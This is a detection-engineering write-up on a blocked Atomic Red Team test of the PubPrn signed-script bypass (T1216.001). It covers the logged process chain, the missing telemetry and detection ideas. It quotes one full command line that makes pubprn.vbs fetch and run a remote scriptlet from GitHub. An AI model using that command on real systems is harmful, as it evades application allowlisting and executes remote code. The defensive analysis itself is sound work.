# T1216.001-1: PubPrn — PubPrn.vbs Signed Script Bypass

## Technique Context

T1216.001 (PubPrn) is a defense evasion technique that leverages the legitimate Windows script `pubprn.vbs` to execute arbitrary code while bypassing application allowlisting and script execution policies. Located in `C:\Windows\System32\Printing_Admin_Scripts\`, this Microsoft-signed VBScript is designed for printer administration but can be abused to execute remote scripts via its URL parameter. Attackers use this technique because the script's legitimate provenance allows it to bypass many security controls that would block unsigned or suspicious scripts. The detection community focuses on monitoring unusual arguments to `pubprn.vbs`, particularly remote URL references and the use of `cscript.exe` to execute it, as well as network connections to fetch remote payloads.

## What This Dataset Contains

This dataset captures a PubPrn bypass attempt that was blocked by Windows Defender. The key evidence appears in Security event 4688, which shows the malicious command line:

`"cmd.exe" /c cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"`

The dataset shows the process creation chain: PowerShell (PID 23232) spawned cmd.exe (PID 34300) with the malicious pubprn.vbs command. However, cmd.exe exited with status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution before the technique could complete. Sysmon event 1 captured the whoami.exe execution (likely part of reconnaissance), while Sysmon events 7, 8, 10, 11, and 17 document PowerShell's initialization and process interactions. The PowerShell channel contains only test framework boilerplate (Set-StrictMode, Set-ExecutionPolicy Bypass).

## What This Dataset Does Not Contain

This dataset lacks the complete attack chain because Windows Defender terminated the cmd.exe process before it could execute cscript.exe and download the remote script component. Missing telemetry includes: cscript.exe process creation, the actual pubprn.vbs execution, network connections to fetch the remote SCT file from GitHub, and any code execution that would have resulted from the downloaded script. Additionally, there are no Sysmon ProcessCreate events for cmd.exe or potential cscript.exe processes due to the sysmon-modular configuration's include-mode filtering, which focuses on known-suspicious binaries.

## Assessment

This dataset provides good evidence of the attack attempt but limited insight into successful PubPrn execution due to Defender's blocking. The Security 4688 events with command-line logging are excellent for detection engineering, clearly showing the malicious pubprn.vbs invocation with remote URL parameters. However, the lack of follow-on execution events limits its utility for understanding the full technique mechanics or building detections for successful bypasses. The dataset effectively demonstrates how modern endpoint protection can prevent this technique while still generating valuable forensic evidence of the attempt.

## Detection Opportunities Present in This Data

1. **Unusual PubPrn Arguments** - Monitor Security 4688 events for `pubprn.vbs` execution with `script:` prefixed URLs or remote references in the second parameter

2. **Suspicious Process Chain** - Alert on cmd.exe spawning cscript.exe with pubprn.vbs arguments, especially when the parent is PowerShell or other scripting engines

3. **Remote Script URLs** - Detect pubprn.vbs command lines containing HTTP/HTTPS URLs, particularly to public repositories like GitHub or pastebin services  

4. **Blocked Execution Patterns** - Correlate Security 4688 process creation events with exit codes indicating access denied (0xC0000022) for potential bypass attempts

5. **PowerShell to CMD Chain** - Monitor for PowerShell processes spawning cmd.exe with `/c` parameter followed by cscript.exe execution
